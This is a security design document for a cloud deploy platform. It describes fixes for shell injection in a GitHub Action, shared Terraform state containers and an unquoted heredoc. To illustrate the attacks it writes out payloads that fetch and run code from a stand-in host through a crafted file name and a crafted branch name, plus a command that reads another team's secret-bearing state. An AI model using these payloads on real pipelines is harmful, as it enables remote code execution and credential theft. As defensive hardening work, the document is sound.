# Security Hardening: injection + per-stack state isolation — Design

**Date:** 2026-07-25
**Status:** Approved
**Repo:** `vgmello/cloud-app`

## Overview

Three security fixes found by a post-merge review of the deploy platform. Two
are Critical and exploitable by the _expected_ population of onboarded caller
repos — no outside attacker required, no registry-lock bypass, and neither
leaves an obvious trace.

1. **C1 — Shell injection in `deploy-stack`** → RCE inside the control repo's
   most privileged job.
2. **C2 — Terraform state is isolated by blob prefix, not by container**, while
   RBAC is granted at container scope → any stack's identity can read and write
   every other stack's state _within the same environment_.
3. **I1 — Unquoted heredoc** in the caller-side bootstrap summary → command
   substitution from a branch name.

Out of scope for this branch (tracked separately): the Lane B first-deploy trap,
Key Vault firewall accumulation, `CalledProcessError` surfacing, self-asserted
caller identity, App-token permission scoping.

---

## C1 — Shell injection in `deploy-stack`

### The defect

`.github/actions/deploy-stack/action.yml:82`

```yaml
--manifest "caller-workspace/${{ inputs.stack-file }}"
```

`stack-file` is caller-controlled end to end: `cloud-app/action.yml` →
`dispatch_and_wait.py` → `bootstrap.yml` → `deploy-stack`. Every _other_
caller-controlled value in this action is passed via `env:` and referenced as
`"$VAR"` — the step immediately above (lines 59-72) even documents the rule.
This one line breaks it, and GitHub expands `${{ }}` into the script text before
bash parses it, so a quote in the value terminates the string.

`registry.resolve_stack_path` does not help: it validates path _containment_
only (`realpath` + prefix), deliberately permitting any character.

**Attack.** An onboarded caller commits a file literally named
`a";curl -s https://evil/x|bash;#.yml` declaring a fresh (unclaimed) stack name,
then sets `manifest:` to it. Ownership validation passes — trust-on-first-use
registers any unclaimed name. The parse step then expands to arbitrary code in
the control repo's bootstrap job, which holds `APP_ID`/`APP_PRIVATE_KEY` for
every onboarded repo, `contents: write` on the control repo, and the OIDC
subject the subscription-scoped bootstrap identity trusts.

### The fix

Two layers, so correctness does not depend on quoting discipline at every future
call site:

1. **Never interpolate.** Pass through `env:` and reference as `"$STACK_FILE"`,
   matching the sibling step:

   ```yaml
   env:
     STACK_FILE: ${{ inputs.stack-file }}
   run: >-
     python3 -m cloudapp parse-manifest
     --manifest "caller-workspace/$STACK_FILE"
   ```

2. **Charset allowlist at the gate.** `engine/cloudapp/registry.py` gains

   ```python
   STACK_FILE_RE = re.compile(r"^[A-Za-z0-9._/-]{1,255}$")
   ```

   and `validate_names` takes a fourth argument `stack_file`, rejecting anything
   that fails the pattern, is absolute, or contains a `..` path segment.
   `cmd_validate_lock` passes `args.stack_file`. This runs as the first step of
   `deploy-stack`, before parse and before the Azure login, and fails the job
   closed.

Same class, same fix, cheap: `cloud-app/action.yml:126` interpolates
`inputs.manifest` into the caller-side parse command. Route it through the
existing `MANIFEST` env var (lines 84-85 and 99-100 already do this correctly).

---

## C2 — Per-(stack, environment) Terraform state containers

### What is already correct

- **Cross-environment isolation holds.** Each environment has its own state
  storage account (`sttfstatedev` / `sttfstatestaging` / `sttfstateprod`), and
  the grants are scoped to that environment's account.
- **Identities are already per (stack, environment)** — plan/apply managed
  identities live in `rg-<base>-<env>`.
- **The bootstrap identity is per environment** — `id-cloudapp-bootstrap-<env>`,
  federated to `repo:<control>:environment:<env>`.

### The defect

Within one environment, every stack shares a single container
(`state_backend.container`, `tfstate`), separated only by a blob prefix
(`backend.state_key` → `<name>/<env>.tfstate`). But the role assignments in
`terraform/azure/bootstrap/main.tf:63-75` are scoped to the **container**:

```hcl
state_scope = "${var.state_account_id}/blobServices/default/containers/${var.state_container}"
# plan  → Storage Blob Data Reader      @ state_scope
# apply → Storage Blob Data Contributor @ state_scope
```

So stack A's apply identity is Contributor over stack B's state.

**Attack — no injection, no lock bypass.** A caller adds one step _after_ the
action in its own job, reusing the az session `azure/login` already
established:

```bash
az storage blob download --account-name <acct> --container-name tfstate \
  --name victims-stack/prod.tfstate --auth-mode login
```

Both inputs are readable: the storage account is in `environments/<env>.yml`
(which the action checks out into the caller's workspace) and victim stack names
are listed in `registries/<env>/`. Terraform state is plaintext — database
administrator passwords, storage account keys. The same identity can overwrite
another team's state, which becomes resource hijack or mass-destroy on that
team's next apply.

The plan identity is worse: its subject list includes
`repo:<app>:pull_request` (`identity.py:42`), which carries no environment
component — an unapproved PR run can read every stack's state in that
environment.

### The fix — a container per (stack, environment)

**Main stack state moves to its own container**, created during that
environment's bootstrap, with plan/apply grants scoped to _that container only_.

**Bootstrap stack state stays in the shared container.** This is correct, not a
compromise:

- `id-cloudapp-bootstrap-<env>` is a **single control-plane identity per
  environment**, used for every stack in that environment. Callers never hold
  it, so there is no cross-stack boundary to breach in the shared container.
- It resolves the ordering problem: Terraform cannot `init` into a container
  that the same run has not created yet.

Naming: `<stack>-<env>`, normalized to Azure container rules (3-63 chars,
lowercase alphanumerics and single hyphens, must start and end alphanumeric, no
consecutive hyphens). The stack-name regex permits a trailing hyphen, which
would produce an invalid `foo--dev`, so normalization collapses runs of
non-alphanumerics to a single `-` and strips the ends — the same approach as
`secrets.sentinel_kv_name`.

### Components

**Terraform — `terraform/azure/bootstrap/main.tf`**

```hcl
resource "azurerm_storage_container" "state" {
  count                 = var.state_account_id == "" ? 0 : 1
  name                  = var.stack_state_container
  storage_account_id    = var.state_account_id
  container_access_type = "private"
}
```

This mirrors the working precedent in `modules/shared/storage/main.tf:17`
(azurerm `~> 4.0`, ARM-based, `storage_account_id`). `plan_state` and
`apply_state` re-scope from `local.state_scope` to
`azurerm_storage_container.state[0].resource_manager_id`, which is exactly the
`<account>/blobServices/default/containers/<name>` ARM id a role assignment
needs. `local.state_scope` remains only for the bootstrap identity's own grant.

**Terraform — `terraform/azure/subscription-bootstrap/main.tf`**

The bootstrap custom role currently carries only resourceGroups /
managedIdentity / roleAssignments actions and therefore **cannot create a
container**. It gains:

```
"Microsoft.Storage/storageAccounts/blobServices/containers/read",
"Microsoft.Storage/storageAccounts/blobServices/containers/write",
```

This is a deliberate widening of the most privileged role in the system and is
called out explicitly here rather than slipped in — see `#4` in
`docs/review-findings-pending.md`, which already tracks bootstrap-role
escalation. The actions are management-plane container CRUD, scoped by the
role's existing `assignable_scopes`; they do not grant data-plane read of blob
_contents_.

**Engine — `engine/cloudapp/backend.py`**

```python
def stack_container(sb, name, env, stack="main"):
    """Container for one stack+environment.

    The bootstrap stack keeps its state in the shared platform container (a
    single per-environment control-plane identity owns all of them, and the
    container must exist before bootstrap runs). The main stack gets its own
    container so plan/apply grants can be scoped to it.
    """
```

Returns `sb["container"]` for `stack == "bootstrap"`, else the normalized
`<name>-<env>`. `render` uses it for `container_name=`, and `state_exists`
probes the same container so the first-deploy signal stays consistent.
`state_key` is unchanged (`<name>/<env>.tfstate`) to keep the diff small; the
prefix is now redundant but harmless.

**Engine — `engine/cloudapp/cli.py`**

`cmd_bootstrap_vars` emits a new `stack_state_container` tfvar computed from the
same helper, so Terraform and the backend config can never disagree.

### Migration

None. The platform has never run against a live subscription, so no state
exists to move.

### Why this over ABAC conditions

The reviewer proposed an ABAC condition on the blob path prefix. A native
container scope is stronger: it also closes container-level `list` (which a
path condition on read/write would not), needs no condition-expression
correctness argument, and matches the stated design.

---

## I1 — Unquoted heredoc in the bootstrap summary

`.github/actions/cloud-app/action.yml:167-178`

```bash
cat <<EOF >> "$GITHUB_STEP_SUMMARY"
- **Caller Branch:** \`${{ github.ref_name }}\`
```

An unquoted heredoc delimiter performs `$(...)` and backtick expansion on the
body; the backslash-escapes protect the literal markdown backticks, not the
interpolated values. `steps.parse.outputs.name` is schema-pinned and
`TARGET_RUN_URL` is server-generated, but **`github.ref_name` is a branch
name**, and git permits `$`, `(`, `)`.

**Attack.** A collaborator with push access to branches but _not_ to
`.github/workflows` (protected `main` + CODEOWNERS — the common setup) pushes a
branch named `$(curl -s https://evil/x|bash)`. If the caller's workflow fires on
that branch, they get execution in the deploy job, which holds
`app-private-key` and a live Azure OIDC session. The step is `if: always()`, so
it runs even when bootstrap failed.

**Fix.** Quote the delimiter (`<<'EOF'`) and pass every value through `env:`,
referencing them as `$VAR` — the pattern already used correctly at lines 84-85,
99-100 and 407-409.

---

## Files

**Modified**

- `.github/actions/deploy-stack/action.yml` — C1 env-var fix.
- `.github/actions/cloud-app/action.yml` — I1 heredoc; `inputs.manifest` via env.
- `engine/cloudapp/registry.py` — `STACK_FILE_RE`, `validate_names` gains `stack_file`.
- `engine/cloudapp/cli.py` — pass `stack_file` to `validate_names`; emit `stack_state_container`.
- `engine/cloudapp/backend.py` — `stack_container`, used by `render` and `state_exists`.
- `terraform/azure/bootstrap/{main.tf,variables.tf}` — per-stack container + re-scoped grants.
- `terraform/azure/subscription-bootstrap/main.tf` — container CRUD actions.
- Tests: `engine/tests/py/{test_registry.py,test_backend.py,test_cli.py}`,
  `terraform/azure/bootstrap/tests/bootstrap.tftest.hcl`.

## Testing

- **C1:** `validate_names` rejects `a";curl…`, absolute paths, and `..`
  segments; accepts ordinary `cloud-app.yml` and `subdir/app.yml`. A grep-style
  assertion that no `${{ inputs.stack-file }}` remains inside a `run:` block.
- **C2:** `stack_container` returns the shared container for `stack="bootstrap"`
  and the normalized `<name>-<env>` for main; normalization collapses a trailing
  hyphen (`foo-` + `dev` → `foo-dev`, never `foo--dev`); `render` emits the
  per-stack container; `state_exists` probes it. Terraform test asserts the
  container resource exists and that `plan_state`/`apply_state` scope to the
  container's `resource_manager_id`, not the shared `state_scope`.
- **I1:** assert the heredoc uses a quoted delimiter and that no `${{ }}`
  appears inside the heredoc body.
- Full engine suite + `ruff` + `terraform test` + `terraform fmt -check` green.

## Rollout note

C1 and I1 take effect immediately on merge. C2 changes where new stacks store
state; because nothing is live, there is no cutover. The
`subscription-bootstrap` role change must be applied before the first bootstrap
run, otherwise container creation fails with an authorization error.
